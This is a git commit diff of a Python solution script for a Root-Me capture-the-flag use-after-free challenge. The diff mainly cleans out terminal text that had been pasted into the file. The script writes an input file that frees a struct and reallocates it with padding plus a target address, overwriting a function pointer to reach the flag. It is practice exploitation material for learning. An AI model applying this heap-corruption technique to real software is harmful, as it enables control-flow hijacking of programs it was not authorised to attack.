4d9af9b8ed6eca2e15aeb033556799228bc02901
Or Gany <gangana3@gmail.com>
2020-04-04 09:31:00 -0400

    Updating solution

--- rootme/app_system/elfx86_use_after_free_basic/solution.py
+++ rootme/app_system/elfx86_use_after_free_basic/solution.py
@@ -1,14 +1,14 @@
-class Actions:                                                                                                       │john@john:~/ctfs/rootme/app_system/elfx86_use_after_free_basic$ echo -ne "1: Buy a dog\n2: Make him bark\n3: Bring me
-    BuyADog = b'1'                                                                                                   │ the flag\n4: Watch his death\n5: Build dog house\n6: Give dog house to your dog\n7: Break dog house\n0: Quit"
-    MakeHimBark = b'2'                                                                                               │1: Buy a dog
-    BringMeTheFlag = b'3'                                                                                            │2: Make him bark
-    WatchHisDeath = b'4'                                                                                             │3: Bring me the flag
-    BuildADogHouse = b'5'                                                                                            │4: Watch his death
-    GiveDogHouseToYourDog = b'6'                                                                                     │5: Build dog house
-    BreakDogHouse = b'7'                                                                                             │6: Give dog house to your dog
-                                                                                                                     │7: Break dog house
-                                                                                                                     │0: Quitjohn@john:~/ctfs/rootme/app_system/elfx86_use_after_free_basic$ 
-                                                                                                                     │
+class Actions:                  
+    BuyADog = b'1'              
+    MakeHimBark = b'2'          
+    BringMeTheFlag = b'3'       
+    WatchHisDeath = b'4'        
+    BuildADogHouse = b'5'       
+    GiveDogHouseToYourDog = b'6'
+    BreakDogHouse = b'7'        
+                                
+                                
+                                
 def main():
     """
     Use after free bug relies on the implementation of malloc and free. 
@@ -28,20 +28,20 @@ def main():
      -) Build a dog house with address that its last 4 bytes are the bringBackTheFlag address, since we want to write to index 12 in the Dog 
         struct which is the brark function. The house name doesn't matter.
      -) Choose Bring me the flag
-    """                                                                                                          │
-    dog_name = b'Plotu'                                                                                              │
-    house_address = b'a' * 12 + int.to_bytes(0x80487cb, 4, 'little')                                                 │
-    house_name = b'irelevant'                                                                                        │
-                                                                                                                     │
-    with open('input', 'wb') as input_file:                                                                          │
-        input_file.write(Actions.BuyADog + b'\n')                                                                    │
-        input_file.write(dog_name + b'\n')                                                                           │
-        input_file.write(Actions.WatchHisDeath + b'\n')                                                              │
-        input_file.write(Actions.BuildADogHouse + b'\n')                                                             │
-        input_file.write(house_address + b'\n')                                                                      │
-        input_file.write(house_name + b'\n')                                                                         │
-        input_file.write(Actions.BringMeTheFlag + b'\n')                                                             │
-                                                                                                                     │
-                                                                                                                     │
-if __name__ == '__main__':                                                                                           │
+    """                                                                                    
+    dog_name = b'Plotu'                                                                    
+    house_address = b'a' * 12 + int.to_bytes(0x80487cb, 4, 'little')                       
+    house_name = b'irelevant'                                                              
+                                                                                           
+    with open('input', 'wb') as input_file:                                                
+        input_file.write(Actions.BuyADog + b'\n')                                          
+        input_file.write(dog_name + b'\n')                                                 
+        input_file.write(Actions.WatchHisDeath + b'\n')                                    
+        input_file.write(Actions.BuildADogHouse + b'\n')                                   
+        input_file.write(house_address + b'\n')                                            
+        input_file.write(house_name + b'\n')                                               
+        input_file.write(Actions.BringMeTheFlag + b'\n')                                   
+                                                                                           
+                                                                                           
+if __name__ == '__main__':                                                                 
     main()
